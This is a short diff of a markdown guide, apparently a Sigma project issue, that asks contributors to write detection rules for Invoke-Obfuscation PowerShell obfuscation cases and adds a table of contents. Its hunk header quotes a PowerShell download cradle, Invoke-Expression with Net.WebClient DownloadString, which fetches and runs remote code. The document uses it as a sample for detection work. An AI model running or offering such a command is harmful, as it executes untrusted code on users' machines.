@@ -17,6 +17,17 @@ SET SCRIPTBLOCK Invoke-Expression (New-Object Net.WebClient).DownloadString('htt
 ```
 #### Just pick up the obfuscation method(s) and the appropriate Case(s) # you prefer and write a Sigma rule(s) for them. When you're done, create a Pull Request to OSCD Sigma branch and specify this issue's number and the number of the case(s) you solved <br/> (*e.g., "Develop Sigma rules for Invoke-Obfuscation #578 Case #1"*) <br/> (*e.g., "Develop Sigma rules for Invoke-Obfuscation #578 Case #1,3,7"*) <br/> (*e.g., "Develop Sigma rules for Invoke-Obfuscation #578 Case #1-15"*) <br/> Remember, you will need to use [regular expressions](https://github.com/Neo23x0/sigma/wiki/Specification#types) in Sigma rules.
 
+### Contents
+SINGLE OBFUSCATION
+  - [TOKEN OBFUSCATION]()
+  - [STRING OBFUSCATION]()
+  - [ENCODING OBFUSCATION]()
+  - [COMPRESS OBFUSCATION]()
+  - [PS LAUNCHER OBFUSCATION]()
+  - [CMD LAUNCHER OBFUSCATION]()
+  - [WMIC LAUNCHER OBFUSCATION]()
+MULTIPLE OBFUSCATION
+
 ### TOKEN OBFUSCATION
 | Case # | Option #1 | Option #2 | Option #3 | Result |
 | :---: | :---: | :---: | :---: | :--- |
